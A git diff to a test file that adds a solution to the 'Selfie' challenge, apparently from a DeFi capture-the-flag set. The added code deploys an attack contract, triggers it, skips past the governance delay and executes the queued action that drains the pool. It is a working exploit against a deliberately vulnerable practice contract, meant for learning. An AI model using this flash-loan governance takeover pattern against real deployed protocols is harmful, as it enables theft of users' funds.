@@ -39,6 +39,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackContract = await (await ethers.getContractFactory("AttackSelfie", player)).deploy(
+            pool.address, governance.address, token.address, player.address
+        )
+        await attackContract.attack();
+        const ACTION_DELAY = 2 * 24 * 60 * 60 + 1;
+        await time.increase(ACTION_DELAY); // how does this stuff work ???
+        // TODO get the correct action Id... we are juste relying on the fact that we put one action there
+        const actionId = await governance.connect(player).getActionCounter();
+        console.log('next action to execute', actionId);
+        await governance.connect(player).executeAction(actionId - 1);
+
     });
 
     after(async function () {
